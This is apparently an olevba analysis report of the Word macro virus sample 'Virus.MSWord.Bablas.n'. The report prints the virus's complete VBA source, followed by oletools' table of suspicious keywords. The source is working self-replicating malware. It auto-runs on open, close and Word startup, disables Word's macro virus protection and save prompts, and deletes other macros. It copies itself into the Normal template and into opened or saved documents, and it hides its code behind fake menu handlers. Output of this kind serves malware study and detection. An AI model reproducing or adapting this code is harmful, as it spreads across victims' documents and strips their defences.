olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AKA.bas 
in file: Virus.MSWord.Bablas.n - OLE stream: 'Macros/VBA/AKA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ShowMessage()
    H = Time
    If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For i = 1 To 100
        Beep
    Next i
    H = MsgBox("Makasih Banget  buat  Temen-temen di CIVITRAVA" & Chr(13) & _
    "And  yang  Udah  Ikutan  Nyebarin  ini  AKA " & Chr(13) & _
    "Terutama  bagi  Mereka  yang  punya  Komputer." & Chr(13) & _
    Chr(13) & "**Buat MALA Salam Manis and Kenal**", vbOKOnly + vbExclamation, "Dari : AKA")
    End If
End Sub

Sub Bablas()
Attribute Bablas.VB_Description = "Macro created 10/02/99 by  Abdul Aziz"
Attribute Bablas.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Cegat"
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ToolsMacro()
    H = MsgBox("Sorry banget, kamu kagak bisa ngruba ini macro.", vbExclamation + vbOKOnly, "Dari : AKA")
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub HelpAbout()
    H = MsgBox("Salam Manis and Kenal Buat MALA and DYNA" & Chr(13) & Chr(13) & _
       "         DO  YOU  FEEL  THE  SAME.........?", vbOKOnly + vbExclamation, "Dari : AKA")
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.VirusProtection = False
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "AKA lagi aktif nih....!!! "
    'ActiveWindow.Caption = "(Mala Aku pingin kenal....)"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    'ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "AKA") = "RISMAH" Then Application.ShowVisualBasicEditor = True
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "AKA" Then DocOk = True
        If Obj.Name <> "AKA" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.StatusBar = "Copying AKA Dari Normal Template to " _
        + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="AKA", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "AKA" Then NorOk = True
        If Obj.Name <> "AKA" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.StatusBar = "Copying AKA Dari " + ActiveDocument.Name + _
        " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="AKA", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    ShowMessage
    Application.Quit
End Sub

Sub FileOpen()
    HelpAbout
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
        RestoreCap
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Bablas
    ChangeCap
    HelpAbout
    SikatTemplate
    On Error Resume Next
    RestoreCap
    NormalTemplate.Save
End Sub


Sub FileSave()
    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
        If ActiveDocument.Name <> "Document1" Then
            Normal.AKA.SikatDocument
            WordBasic.DisableAutoMacros False
        End If
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.AKA.Ancurin"
    End If
End Sub

Sub AutoExec()
    On Error Resume Next
    WordBasic.DisableAutoMacros True
    Bablas
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.AKA.Ancurin"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

